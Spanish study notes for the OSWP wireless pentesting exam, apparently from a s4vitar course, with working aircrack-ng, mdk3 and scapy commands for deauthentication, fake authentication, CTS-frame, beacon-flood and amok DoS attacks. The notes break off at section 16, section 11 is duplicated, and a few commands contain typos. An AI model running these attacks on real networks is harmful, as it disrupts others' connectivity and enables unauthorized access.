# Preparación OSWP (Curso s4vitar)

# Índice de los contenidos

- [[#1. Modo monitor CONCEPTO|1. Modo monitor CONCEPTO]]
- [[#2. Configuración de la tarjeta de red en modo monitor|2. Configuración de la tarjeta de red en modo monitor]]
- [[#3. Falsificación de nuestra dirección MAC y tips|3. Falsificación de nuestra dirección MAC y tips]]
- [[#4. Uso de Airodump para efectuar un análisis del entorno (P.A.)|4. Uso de Airodump para efectuar un análisis del entorno (P.A.)]]
- [[#5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)|5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)]]
- [[#6. Modos de filtro con Airodump|6. Modos de filtro con Airodump]]
- [[#7. Exportación de evidencias con Airodump|7. Exportación de evidencias con Airodump]]
- [[#8. Concepto de HandShake|8. Concepto de HandShake]]
- [[#9. Ataque de Deautenticación dirigido|9. Ataque de Deautenticación dirigido]]
- [[#10. Ataque de Deautenticación global (Broadcast MAC Address)|10. Ataque de Deautenticación global (Broadcast MAC Address)]]
- [[#11. Ataque de Falsa Autenticación|11. Ataque de Falsa Autenticación]]
- [[#12 y 13. CTS Frame Attack (Secuestro del Ancho de Banda de una red)|12 y 13. CTS Frame Attack (Secuestro del Ancho de Banda de una red)]]
- [[#14. Ataque Beacon Flood Mode|14. Ataque Beacon Flood Mode]]
- [[#15. Ataque Disassociation Amok Mode|15. Ataque Disassociation Amok Mode]]
- [[#16. Ataque Michael Shutdown Exploitation (Apagado de un Router en remoto)|16. Ataque Michael Shutdown Exploitation (Apagado de un Router en remoto)]]
- [[#17. Técnicas pasivas de explotación|17. Técnicas pasivas de explotación]]
- [[#18. Instalación compilación y validación del HandShake con Pyrit (NO FUNCIONA)|18. Instalación compilación y validación del HandShake con Pyrit (NO FUNCIONA)]]
- [[#19. Análisis de los paquetes Probe Request|19. Análisis de los paquetes Probe Request]]
- [[#20. Análisis de los paquetes Probe Response|20. Análisis de los paquetes Probe Response]]
- [[#21. Análisis de los paquetes Association Request|21. Análisis de los paquetes Association Request]]
- [[#22. Análisis de los paquetes Association Response|22. Análisis de los paquetes Association Response
- [[#23. Análisis de paquetes Beacon|23. Análisis de paquetes Beacon]]
- [[#24. Análisis de paquetes de Autenticación|24. Análisis de paquetes de Autenticación]]
- [[#25. Análisis de paquetes de Deautenticación|25. Análisis de paquetes de Deautenticación]]
- [[#26. Análisis de paquetes de Desasociación|26. Análisis de paquetes de Desasociación]]
- [[#27. Extracción del Hash en el HandShake con Aircrack|27. Extracción del Hash en el HandShake con Aircrack]]
- [[#28. Fuerza bruta con John para obtener la contraseña de la red|28. Fuerza bruta con John para obtener la contraseña de la red]]
- [[#29. Fuerza bruta con Aircrack para obtener la contraseña de la red|29. Fuerza bruta con Aircrack para obtener la contraseña de la red]]
- [[#30. Proceso de ataque con Bettercap|30. Proceso de ataque con Bettercap]]
- [[#31. Técnicas de aumento de la velocidad de cómputo (Rainbow Table)|31. Técnicas de aumento de la velocidad de cómputo (Rainbow Table)]]
- [[#32. Cracking con Pyrit|32. Cracking con Pyrit]]
- [[#33. Cracking con Cowpatty|33. Cracking con Cowpatty]]
- [[#34. Cracking con Airolib|34. Cracking con Airolib]]
- [[#35. Creación de una Rainbow Table con GenPMK|35. Creación de una Rainbow Table con GenPMK]]
- [[#36. Cracking con Cowpatty frente a una Rainbow Table|36. Cracking con Cowpatty frente a una Rainbow Table]]
- [[#37. Cracking con Pyrit frente a una Rainbow Table|37. Cracking con Pyrit frente a una Rainbow Table]]
- [[#38. Cracking con Pyrit a través de ataque por base de datos|38. Cracking con Pyrit a través de ataque por base de datos]]
- [[#39. Técnicas de espionaje|39. Técnicas de espionaje]]
- [[#40. Uso de Airdecap para el desencriptado de paquetes|40. Uso de Airdecap para el desencriptado de paquetes]]
- [[#41. Ataques graciosos|41. Ataques graciosos]]
- [[#42. Reemplazado de imágenes web con Xerosploit|42. Reemplazado de imágenes web con Xerosploit]]
- [[#43. Ataque de tipo Evil Twin|43. Ataque de tipo Evil Twin]]
- [[#44. EvilTwin - Configurando nuestro archivo de configuración DHCPD|44. EvilTwin - Configurando nuestro archivo de configuración DHCPD]]
- [[#45 y 46 . EvilTwin - Descarga y uso de plantilla. Creación de base de datos en MYSQL|45 y 46 . EvilTwin - Descarga y uso de plantilla. Creación de base de datos en MYSQL]]
- [[#47. EvilTwin - Montando el punto de acceso con Airbase|47. EvilTwin - Montando el punto de acceso con Airbase]]
- [[#48. EvilTwin - Definición de reglas con iptables y creación de interfaces de red|48. EvilTwin - Definición de reglas con iptables y creación de interfaces de red]]
- [[#49. EvilTwin - Desplegando finalmente el ataque|49. EvilTwin - Desplegando finalmente el ataque]]
- [[#50. Uso de mi herramienta evilTrust para robo de credenciales en redes sociales|50. Uso de mi herramienta evilTrust para robo de credenciales en redes sociales]]
- [[#51. Ataque a redes sin clientes|51. Ataque a redes sin clientes]]
- [[#52. Ataque desde Bettercap|52. Ataque desde Bettercap]]
- [[#53. Ataque vía hcxdumptool|53. Ataque vía hcxdumptool]]
- [[#54. Uso de hcxpcaptool y obtención de la contraseña|54. Uso de hcxpcaptool y obtención de la contraseña]]

# Contenido Resumido y Ampliado del Curso

## 1. Modo monitor CONCEPTO

El modo monitor es fundamental para cualquier ataque a redes inalámbricas, ya que permite a la tarjeta de red capturar todos los paquetes que circulan por el aire, independientemente de a quién vayan dirigidos.

### Explicación técnica:
- **Definición**: El modo monitor es un estado especial de las tarjetas de red inalámbricas que permite capturar todos los paquetes sin estar asociado a ningún punto de acceso.
- **Diferencia con modo normal**: En modo normal (managed), la tarjeta solo procesa paquetes dirigidos a su MAC.


## 2. Configuración de la tarjeta de red en modo monitor

### Procedimiento detallado:
1. Identificar la interfaz inalámbrica:
   ```bash
   ifconfig
   ```

2.  Detener procesos que puedan interferir:
   ```bash
airmon-ng check kill
# Esto mata NetworkManager, wpa_supplicant, dhclient, etc.
```

3. Activar el modo monitor:
   ```bash
   sudo airmon-ng start wlan0
   ```
   Donde "wlan0" debe reemplazarse por el nombre de tu interfaz.

- Otra opción: de forma manual:
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

4. Verificar que el modo monitor está activo:
   ```bash
   # ya no se ve en ifconfig
   iwconfig
   # si pone 'DOWN':
   ifconfig wlan0 up
   ```
   La interfaz debería mostrar "Mode:Monitor"

6. Parar el modo monitor:
   ```bash
   airmon-ng stop wlan0
   /etc/init.d/networking restart
   ```

### ¿Qué es **`wpa_supplicant`**?
Es el proceso que se encarga de gestionar la conexión WiFi segura en Linux. Función:
- Autenticarte en el punto de acceso.
- Manejar la negociación de claves.
- Mantener la conexión activa.

Sin `wpa_supplicant`, no te puedes conectar a redes WiFi cifradas.

Por eso, cuando estás conectado a WiFi normal (modo _managed_), el proceso está corriendo en segundo plano.

Cuando pones la tarjeta en **modo monitor**, este proceso sigue intentando gestionar la conexión WiFi, y te puede interferir (por eso se recomienda matarlo con `airmon-ng check kill`).
### ¿Qué es **`dhclient`**?
 Es el cliente DHCP de Linux. Función:

- Pedirle al router una dirección IP cuando te conectas a una red.
- Configurar la IP, la máscara de red, la puerta de enlace, etc.

En modo monitor, **no necesitas IP**, porque no te vas a asociar a ninguna red, sólo a capturar paquetes. Por eso se recomienda matar `dhclient` también.

## 3. Falsificación de nuestra dirección MAC y tips

La falsificación de la dirección MAC es una técnica importante para mantener el anonimato durante las pruebas de penetración y evitar ser detectado o bloqueado.

### Procedimiento técnico:
1. Importante desactivar la interfaz:
   ```bash
   ifconfig wlan0mon down
   ```

 2. Verificar la dirección MAC:
   ```bash
   macchanger -s wlan0mon
   ```

3. Cambiar la dirección MAC:
   ```bash
   macchanger --mac=00:11:22:33:44:55 wlan0mon
   ```
   O para generar una MAC aleatoria:
   ```bash
   macchanger -r wlan0mon
   ```

4. Reactivar la interfaz:
   ```bash
   ifconfig wlan0mon up
   ```

### Tips adicionales:
- Usar direcciones MAC de fabricantes reales para evitar detección
```bash
macchanger -l | greep -i "fabricante"
# los últimos 6 pueden ser inventados
```
- Cambiar la MAC regularmente durante sesiones largas de auditoría
- Algunas tarjetas requieren ser reiniciadas completamente para que el cambio sea efectivo
### Consideraciones de seguridad:
- Los puntos de acceso modernos pueden detectar comportamientos sospechosos incluso con MAC falsificada
- Algunos routers empresariales tienen sistemas de detección de intrusiones que pueden identificar patrones de tráfico anómalos

## 4. Uso de Airodump para efectuar un análisis del entorno (P.A.)

Airodump-ng es una herramienta fundamental para la recopilación de información sobre redes inalámbricas en el entorno, permitiendo identificar puntos de acceso, clientes conectados y otros datos relevantes.
### Comando básico:
```bash
airodump-ng wlan0mon
```

### Información mostrada:
- Primera línea:
		Canal, Tiempo transcurrido, fecha, y si se ha capturado un handshake y de que red

- **BSSID**: Dirección MAC del punto de acceso
- **PWR**: Nivel de señal (cuanto más cercano a 0, más fuerte). Si es -1 significa que estamos fuera del alcance o que el controlador no acepta informes de nivel de señal
- **Beacons**: Número de paquetes beacon capturados
- **Data**: Paquetes de datos (importante para capturar handshakes)
- `#/s` nº de paquetes de datos enviados por segundo (ultimos 10 seg)
- **CH**: Canal en el que opera la red
- **MB**: Velocidad máxima soportada
- **ENC**: Tipo de cifrado (WEP, WPA, WPA2,OPN)
- **CIPHER**: Algoritmo de cifrado (TKIP, CCMP)
- **AUTH**: Tipo de autenticación (PSK, MGT)
- **ESSID**: Nombre de la red

### Consideraciones importantes:
- Las redes WPA y WPA2 se muestran de forma diferente en Airodump
- WPA utiliza típicamente TKIP como cifrado
- WPA2 utiliza típicamente CCMP (basado en AES) como cifrado
- Solo se pueden atacar redes con autenticación PSK (Pre-Shared Key)
- Las redes empresariales (AUTH=MGT) utilizan autenticación 802.1X y no son vulnerables a los ataques de diccionario convencionales

### Vulnerabilidades específicas:
- WPA con TKIP es vulnerable a ataques de reinstalación de clave (KRACK)
- WPA2 con CCMP ofrece mejor seguridad pero sigue siendo vulnerable a ataques de fuerza bruta si la contraseña es débil

## 5. Uso de Airodump para efectuar un análisis del entorno 2 (clientes)

### Técnicas avanzadas:
1. Monitorización de clientes conectados:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] wlan0mon
   ```

2. Identificación de relaciones cliente-AP:
	La parte inferior de la pantalla de Airodump muestra los clientes y a qué AP están conectados

   - **STATION**: Dirección MAC del cliente
   - **PWR**: Nivel de señal del cliente
   - **Rate**: Velocidad de transmisión
   - **Lost**: Paquetes perdidos
   - **Frames**: Número de frames capturados
   - **Probes**: Redes a las que el cliente ha intentado conectarse anteriormente

### Consideraciones de versiones:
- Las redes WPA y WPA2 se tratan de manera similar en esta fase de reconocimiento
- Los clientes conectados a redes WPA2-Enterprise no mostrarán información útil para ataques de PSK

### Limitaciones:
- Algunos dispositivos modernos utilizan MAC aleatoria para probe requests, dificultando el seguimiento
- Los dispositivos iOS y Android recientes ocultan el SSID real en sus probe requests como medida de privacidad
- La efectividad depende de la actividad de los clientes en la red


## 6. Modos de filtro con Airodump

Este video explica las diferentes opciones de filtrado en Airodump-ng para optimizar la captura de información relevante y reducir el ruido.

### Opciones de filtrado principales:

| **Función**                        | **Comando**                                                                             |
| ---------------------------------- | --------------------------------------------------------------------------------------- |
| Filtrado por canal                 | `bash<br>airodump-ng -c 6 wlan0mon<br>`                                                 |
| Uso de listas de BSSIDs            | `airodump-ng -c 1,6,11 wlan0mon`                                                        |
| Filtrado por BSSID (MAC del AP)    | `bash<br>airodump-ng --bssid 00:11:22:33:44:55 wlan0mon<br>`                            |
| Filtrado por ESSID (nombre de red) | `bash<br>airodump-ng --essid "NombreDeRed" wlan0mon<br>`                                |
| Combinación de filtros             | `bash<br>airodump-ng -c 6 --bssid 00:11:22:33:44:55 --essid "NombreDeRed" wlan0mon<br>` |


## 7. Exportación de evidencias con Airodump

Este video muestra cómo guardar la información capturada por Airodump-ng para su posterior análisis o como evidencia en auditorías de seguridad.

### Opciones de exportación:
| **Descripción**               | **Comando**                                                                       |
| ----------------------------- | --------------------------------------------------------------------------------- |
| Guardar en formato básico     | `airodump-ng -w <nombreArchivo>  wlan0mon`                                        |
| Guardar con filtros aplicados | `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w <nombreArchivo>  wlan0mon`         |
| Especificar formato de salida | `airodump-ng -w <nombreArchivo>  --output-format pcap,csv,kismet,netxml wlan0mon` |
de aquí salen unos 5 archivos. el que nos interesa es el .cap

- Para ver el tamaño del fichero durante la captura (en otra terminal):
```bash
watch -n 1 du -hc captura-01.cap
```
### Formatos de archivo generados:
•captura-01.cap: Archivo de captura en formato pcap (compatible con Wireshark)
•captura-01.csv: Datos en formato CSV para análisis en hojas de cálculo
•captura-01.kismet.csv: Formato compatible con Kismet
•captura-01.kismet.netxml: Datos en formato XML

### Consideraciones importantes:
- Para capturas específicas de handshakes, es recomendable usar el formato pcap
- Se recomienda usar la opción --write-interval para dividir capturas largas

### Comando completo recomendado:
```bash
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura --output-format pcap --write-interval 300 wlan0mon
```

### Aplicabilidad por versiones:
- Estos filtros funcionan igual para redes WPA y WPA2
- Para redes que utilizan band steering (cambio entre 2.4GHz y 5GHz), puede ser necesario monitorear múltiples canales


## 8. Concepto de HandShake

### Explicación técnica del handshake:
- El handshake es un proceso de 4 vías (4-way handshake) que ocurre cuando un cliente se conecta a una red WPA/WPA2
- Durante este proceso, el cliente y el punto de acceso intercambian información para derivar las claves de cifrado
- El handshake contiene suficiente información para verificar contraseñas offline

### Estructura del 4-way handshake:
Durante este intercambio, el cliente y el punto de acceso (AP) **generan y verifican las claves que cifrarán la comunicación**.
1. AP → Cliente: Envía ANonce (número aleatorio)
2. Cliente → AP: Envía SNonce y MIC (código de integridad del mensaje)
3. AP → Cliente: Envía GTK (Group Temporal Key) cifrada
4. Cliente → AP: Confirmación

### Vulnerabilidades específicas:
- Ni WPA ni WPA2 son vulnerables a ataques de recuperación de clave a partir del handshake
- La única forma de obtener la contraseña es mediante fuerza bruta o diccionario
- WPA con TKIP es vulnerable a ataques adicionales como el ataque Beck-Tews
- WPA2 con CCMP es vulnerable a KRACK (Key Reinstallation Attack) en implementaciones específicas


## 9. Ataque de Deautenticación dirigido

Este video explica cómo realizar un ataque de deautenticación dirigido para forzar a un cliente específico a desconectarse y reconectarse, generando así un handshake que puede ser capturado.

- No requieren autenticación para ser procesados (vulnerabilidad de diseño)
### Procedimiento detallado:
1. Identificar el AP objetivo y un cliente conectado:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación dirigido:
   ```bash
   aireplay-ng -0 10 -e [ESSID_del_AP] -c [MAC_del_cliente] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - `-c` especifica la MAC del cliente objetivo

### Consideraciones prácticas:
- Usar pocos paquetes (1-5) para ser menos detectable
- Verificar que el handshake ha sido capturado (aparecerá "WPA handshake" en la esquina superior derecha de airodump-ng)
- Algunos dispositivos modernos pueden ignorar frames de deautenticación sospechosos
- La efectividad depende de la distancia y potencia de la señal

### Contramedidas y limitaciones:
- Algunos APs empresariales detectan ataques de deautenticación
- WPA3 implementa protección contra este tipo de ataques
- Este ataque es detectable por sistemas de detección de intrusiones inalámbricas (WIDS)


## 10. Ataque de Deautenticación global (Broadcast MAC Address)

Este video muestra una variante más agresiva del ataque de deautenticación, dirigida a todos los clientes de una red simultáneamente.

### Diferencias con el ataque dirigido:
- Afecta a todos los clientes conectados al AP
- Más efectivo para capturar handshakes en redes con múltiples clientes
- Muy visible para administradores de red y sistemas de seguridad

### Procedimiento técnico:
1. Identificar el AP objetivo:
   ```bash
   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
   ```

2. Ejecutar el ataque de deautenticación global:
   ```bash
   aireplay-ng -0 10 -e [BSSID_del_AP] wlan0mon
   ```
   Donde:
   - `-0` indica ataque de deautenticación
   - `10` es el número de paquetes a enviar (más que en el ataque dirigido). Si queremos mandar un nº ilimitado de paquetes (hasta que hagamos ctl C) debemos poner como número de paquetes “0”
   - `-a` especifica el BSSID del AP
   - `-e` especifica el ESSID del AP
   - La ausencia de `-c` hace que el ataque sea broadcast

Otra forma similar:
```bash
aireplay-ng -0 <numPaquetes> -e <nombreRed> -c FF:FF:FF:FF:FF:FF <nombreTarjetaRed>
```
## 11. Ataque de Falsa Autenticación

### Descripción del Ataque

El ataque de falsa autenticación es una técnica utilizada en redes inalámbricas, especialmente en aquellas que usan cifrado WEP (aunque también puede aplicarse en ciertos escenarios WPA/WPA2), para asociarse con un punto de acceso (AP) sin necesidad de una autenticación real. Su principal utilidad radica en obtener una dirección MAC asociada al AP cuando no hay clientes legítimos conectados, lo cual es crucial para realizar otros ataques de inyección de paquetes, como los ataques de desautenticación o la inyección de ARP.

Es importante destacar que este ataque NO genera paquetes ARP por sí mismo; su objetivo es establecer una asociación falsa para facilitar ataques posteriores que sí los requieran.

### Funcionamiento y Uso (con `aireplay-ng`)

```bash
aireplay-ng -1 0 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `-1`: Indica el modo de falsa autenticación.
- `0`: Tiempo de reasociación en segundos (0 significa no reasociar automáticamente, se mantiene la asociación hasta que el AP la termine).
- `-e [ESSID]`: El nombre de la red inalámbrica (ESSID).
- `-a [MAC_AP]`: La dirección MAC del punto de acceso (BSSID).
- `-h [MAC_CLIENTE_FALSO]`: La dirección MAC del cliente que vamos a añadir (mejor la de nuestra tarjeta).
- `[INTERFACE]`: El nombre de la interfaz inalámbrica en modo monitor (ej. `ath0`, `wlan0mon`).

Una variación útil para algunos APs, que envía paquetes de "sigo aquí" o "keep alive" para mantener la conexión:

```bash
aireplay-ng -1 6000 -o 1 -q 10 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `6000`: Reautentifica cada 6000 segundos. Esto también provoca el envío de paquetes "keep alive".
- `-o 1`: Envía solo un tipo de paquetes a la vez, lo que puede ser útil para APs sensibles.
- `-q 10`: Envía paquetes "keep alive" cada 10 segundos.

### Pistas y Solución de Problemas

- **Fijar la dirección MAC**: Es recomendable cambiar la dirección MAC de nuestra tarjeta inalámbrica para que coincida con la usada en el parámetro `-h`. Esto asegura que los paquetes ACK se envíen correctamente y mejora la efectividad del ataque. Es importante usar una dirección MAC de un fabricante inalámbrico válido para evitar que el AP la ignore.
- **Identificación de autenticaciones fallidas**: Si `aireplay-ng` muestra mensajes como "Got a deauthentication packet!" o reintentos continuos, indica que la autenticación está fallando. Se puede usar `tcpdump` para analizar los paquetes y buscar mensajes de error como "DeAuthentication: Class 3 frame received from nonassociated station", lo que significa que el AP no aceptará los paquetes inyectados.
- **Reasociación**: Algunos APs requieren reasociación periódica (ej. cada 30 segundos). En estos casos, es necesario fijar el periodo de reasociación en el comando `aireplay-ng`.
- **Filtrado MAC**: Si la falsa autenticación nunca tiene éxito, el AP podría tener filtrado MAC activado. La solución es averiguar una dirección MAC válida de un cliente ya asociado (usando `airodump-ng`) y usarla. No se debe intentar la falsa autenticación con una MAC de un cliente activo.


## 11. Ataque de Falsa Autenticación

### Descripción del Ataque

El ataque de falsa autenticación es una técnica utilizada en redes inalámbricas, especialmente en aquellas que usan cifrado WEP (aunque también puede aplicarse en ciertos escenarios WPA/WPA2), para asociarse con un punto de acceso (AP) sin necesidad de una autenticación real. Su principal utilidad radica en obtener una dirección MAC asociada al AP cuando no hay clientes legítimos conectados, lo cual es crucial para realizar otros ataques de inyección de paquetes, como los ataques de desautenticación o la inyección de ARP.

Es importante destacar que este ataque NO genera paquetes ARP por sí mismo; su objetivo es establecer una asociación falsa para facilitar ataques posteriores que sí los requieran.

### Funcionamiento y Uso (con `aireplay-ng`)

```bash
aireplay-ng -1 0 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `-1`: Indica el modo de falsa autenticación.
- `0`: Tiempo de reasociación en segundos (0 significa no reasociar automáticamente, se mantiene la asociación hasta que el AP la termine).
- `-e [ESSID]`: El nombre de la red inalámbrica (ESSID).
- `-a [MAC_AP]`: La dirección MAC del punto de acceso (BSSID).
- `-h [MAC_CLIENTE_FALSO]`: La dirección MAC del cliente que vamos a añadir (mejor la de nuestra tarjeta).
- `[INTERFACE]`: El nombre de la interfaz inalámbrica en modo monitor (ej. `ath0`, `wlan0mon`).

Una variación útil para algunos APs, que envía paquetes de "sigo aquí" o "keep alive" para mantener la conexión:

```bash
aireplay-ng -1 6000 -o 1 -q 10 -e [ESSID] -a [MAC_AP] -h [MAC_CLIENTE_FALSO] [INTERFACE]
```

Donde:

- `6000`: Reautentifica cada 6000 segundos. Esto también provoca el envío de paquetes "keep alive".
- `-o 1`: Envía solo un tipo de paquetes a la vez, lo que puede ser útil para APs sensibles.
- `-q 10`: Envía paquetes "keep alive" cada 10 segundos.

### Pistas y Solución de Problemas

- **Fijar la dirección MAC**: Es recomendable cambiar la dirección MAC de nuestra tarjeta inalámbrica para que coincida con la usada en el parámetro `-h`. Esto asegura que los paquetes ACK se envíen correctamente y mejora la efectividad del ataque. Es importante usar una dirección MAC de un fabricante inalámbrico válido para evitar que el AP la ignore.
- **Identificación de autenticaciones fallidas**: Si `aireplay-ng` muestra mensajes como "Got a deauthentication packet!" o reintentos continuos, indica que la autenticación está fallando. Se puede usar `tcpdump` para analizar los paquetes y buscar mensajes de error como "DeAuthentication: Class 3 frame received from nonassociated station", lo que significa que el AP no aceptará los paquetes inyectados.
- **Reasociación**: Algunos APs requieren reasociación periódica (ej. cada 30 segundos). En estos casos, es necesario fijar el periodo de reasociación en el comando `aireplay-ng`.
- **Filtrado MAC**: Si la falsa autenticación nunca tiene éxito, el AP podría tener filtrado MAC activado. La solución es averiguar una dirección MAC válida de un cliente ya asociado (usando `airodump-ng`) y usarla. No se debe intentar la falsa autenticación con una MAC de un cliente activo.


## 12 y 13. CTS Frame Attack (Secuestro del Ancho de Banda de una red)

### Descripción del Ataque

El ataque CTS (Clear To Send) Frame Attack es una técnica de denegación de servicio (DoS) que explota el mecanismo de control de flujo RTS/CTS (Request To Send/Clear To Send). Este ataque busca monopolizar el ancho de banda de una red inalámbrica al inundarla con tramas CTS falsas con una duración muy larga. El objetivo es causar una contención artificial en la red, lo que interrumpe o interfiere con la conexión inalámbrica de otros clientes, llegando incluso a desautenticarlos para facilitar la captura de un handshake (similar a un ataque de desautenticación).

El mecanismo RTS/CTS es un esquema de reserva utilizado en redes inalámbricas para evitar colisiones de datos, especialmente en entornos con nodos ocultos. Un nodo que desea transmitir envía una trama RTS, y el AP responde con una trama CTS, indicando a todos los demás nodos que deben esperar antes de transmitir. El ataque CTS abusa de esto enviando tramas CTS falsas con una duración excesivamente larga, haciendo que otros dispositivos permanezcan en silencio y no puedan transmitir datos.

### Funcionamiento y Herramientas

Para realizar este ataque, se requiere la creación o modificación de una trama CTS con una duración (Duration) muy larga. El proceso general implica:

1. **Monitorizar la red**: Poner la interfaz inalámbrica en modo monitor y usar `airodump-ng` para escanear la red y obtener el BSSID del AP objetivo.

    ```bash
airmon-ng check kill && airmon-ng start wlan0mon
airodump-ng -c <num> -w <archivo> --bssid 12:34:56:78:9a:bc  wlan0
    ```

2. **Capturar y modificar una trama CTS**:  usar Wireshark ( NO USAR airodump, a veces da falsos positivos y la duración es 0 ).
- con el filtro `wlan.fc.type_subtype == 28`. 
- Una vez capturada, le hacemos clic en uno y File → Export Specified Packets → Export as: Wireshark/tcpdump/.. -pcap → Selected packets only 
- Utilizar `ghex` para modificar su campo `Duration` a un valor (máximo: 30000 microsegundos). Importante, la representación es little-endian (1º menos significativo).
    - los 4 pares del final es Fts
    - los 6 anteriores es la mac del PA
    - los 2 anteriores es la duración en `micro segundos`

3. Si queremos una duración (ej: 30000)
```bash
ghex <nombreCTSframe>
python3
hex(30000)
# → 0x7530    MUY IMP ⇒ es little endian ⇒ 3075
wireshark <nombreCTSframe> # comprobar que el paquete es válido y no se produce error
```

- si queremos atacar a otro PA hay que cambiar el valor hexadecimal al de éste

4. **Inyectar la trama CTS modificada**: Una vez modificada la trama, se utiliza `tcpreplay`, `mdk4` o `scapy` para inyectar repetidamente la trama CTS falsa en la red.
- Usando Scapy:
```bash
nano replay.py
```

```bash
#!/usr/bin/env python3
from scapy.all import *

# Ruta a tu pcap
pkts = rdpcap("CTS-frame-attack.pcap")

# Envía en bucle cada paquete con un retardo mínimo
for pkt in pkts:
    sendp(pkt, iface="wlan0", inter=0.001, loop=1)
```

```bash
sudo python3 replay.py
```
Recordar:
- Tener la interfaz de red en modo monitor y que permita inyectar paquetes
- modificar la ruta al .pcap
- modificar el nombre de la interfaz de red


Tcpreplay y mdk4 a veces fallan.

```bash
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 <nombreCTSframe.pcap> 2>/dev/null
```
    
    - `--intf1`: la interfaz.
    - `--topspeed`: Envía las tramas a la máxima velocidad posible.
    - `--loop`: Especifica la cantidad de veces que se enviará la trama.

## 14. Ataque Beacon Flood Mode

### Descripción del Ataque

El ataque Beacon Flood Mode (o inundación de balizas) es un tipo de ataque de denegación de servicio (DoS) que busca confundir a los clientes inalámbricos y, en algunos casos, a los escáneres de red y drivers, al transmitir un número masivo de tramas beacon falsas. Las tramas beacon son anuncios periódicos que los puntos de acceso (APs) legítimos envían para informar sobre la disponibilidad de la red, su SSID, canal, capacidades de seguridad, etc. Al inundar el entorno con miles de SSIDs falsos, el atacante satura la lista de redes disponibles que ven los usuarios, dificultando la conexión a redes legítimas o incluso causando inestabilidad en los dispositivos.

### Funcionamiento y Herramientas

La herramienta `mdk3` es comúnmente utilizada para realizar este ataque. El proceso implica:

1. **Crear una interfaz en modo monitor**: Es necesario poner la tarjeta inalámbrica en modo monitor para poder inyectar las tramas beacon.
    ```bash
    airmon-ng start <INTERFACE>
    ```

2. **Crear un archivo de diccionario (opcional pero recomendado)**: Para hacer el ataque más efectivo y realista, se puede crear un archivo de texto (`ssid_names.txt`) con una lista de nombres de SSIDs falsos que se desean anunciar. Estos nombres pueden ser similares a redes existentes o simplemente aleatorios.
    ```bash
    nano ssid_names.txt
    ```
- Para hacerlo más simple:
```bash
for i in $(seq 1 10); do echo “MyNetwork$i” >> ssid_names  ; done
```
2. **Ejecutar el ataque con `mdk3`**: Se utiliza el modo `b` (beacon flooding) de `mdk3` junto con opciones para especificar el tipo de red (WPA2, velocidad, etc.) y el archivo de SSIDs.
    ```bash
    mdk3 <tarjetaRed> b -a -f ssid_names.txt -s 1000 -c CHANNEL
    ```
- `b`: Activa el modo Beacon Flood.
- `-a`: Anuncia redes WPA2.
- `-s 1000`: Establece la velocidad de envío de beacons
- `-g`: Anuncia redes WPA/WPA2-encrypted (simulan estar más protegidas)
- `-f ssid_names.txt`: Utiliza el archivo de diccionario con los nombres de los SSIDs falsos.
### Impacto y Detección
 Los sistemas de detección y prevención de intrusiones inalámbricas (WIDS/WIPS) suelen detectar este tipo de ataques debido al alto volumen de tramas beacon inusuales, lo que puede activar alertas y contramedidas.

## 15. Ataque Disassociation Amok Mode

### Descripción del Ataque

El ataque Disassociation Amok Mode es una forma de ataque de denegación de servicio (DoS) que busca desconectar a todos los clientes de una red inalámbrica específica. Utiliza tramas de desasociación (disassociation frames) y desautenticación (deauthentication frames) para forzar a los dispositivos a desconectarse del punto de acceso (AP). Aunque es similar a un ataque de desautenticación dirigido, el "Amok Mode" de herramientas como `mdk3` o `mdk4` se refiere a un modo más agresivo y generalizado, donde se intenta desconectar a todos los clientes encontrados en el rango de la red objetivo.

### Funcionamiento y Herramientas

La herramienta `mdk3` es la principal para este ataque. El modo `d` (Deauthentication / Disassociation Amok Mode) es el que se utiliza.

1. Poner la interfaz en modo monitor: Al igual que en otros ataques de inyección, la tarjeta inalámbrica debe estar en modo monitor.
2. Capturamos con `airodump-ng <nombTarjeta>`
3. Elegimos la red a atacar `airodump-ng -c <canal> -w <nombDoc> —bssid <BSSID> <nombTarjeta>`
4. Creamos un documento 
	- (blacklist -b) `nano <nombBlacklist>` y escribimos todas las direcciones mac que queremos expulsar
	- (whitelist -w) `nano <nombWhitelist>` y escribimos las direcciones mac que NO queremos expulsar
5. Ejecutar el ataque con `mdk3` : 
    ```bash
    mdk3 MONITOR_INTERFACE d -a [MAC_AP]  -w <nombDoc> -c [CHANNEL]
    ```
    - `MONITOR_INTERFACE`: El nombre de la interfaz en modo monitor.
    - `d`: Activa el modo Deauthentication / Disassociation Amok.
    - `-a [MAC_AP]` : La dirección MAC del AP objetivo. Si no se especifica, puede intentar desautenticar a todos los clientes de todos los APs en el rango.
    - `-c [CHANNEL]` (opcional): El canal en el que opera la red objetivo.
    - `-w`: client whitelist -> Desconecta todos menos estos.

### Impacto y Detección

El ataque Disassociation Amok Mode es un ataque de DoS muy efectivo que interrumpe la conectividad de los usuarios. Puede generar una gran cantidad de tráfico de gestión y saturar la red. Al ser un ataque activo, es detectable por sistemas WIDS/WIPS.

## 16. Ataque Michael Shutdown Exploitation (Apagado de un Router en remoto)

### Descripción del Ataque

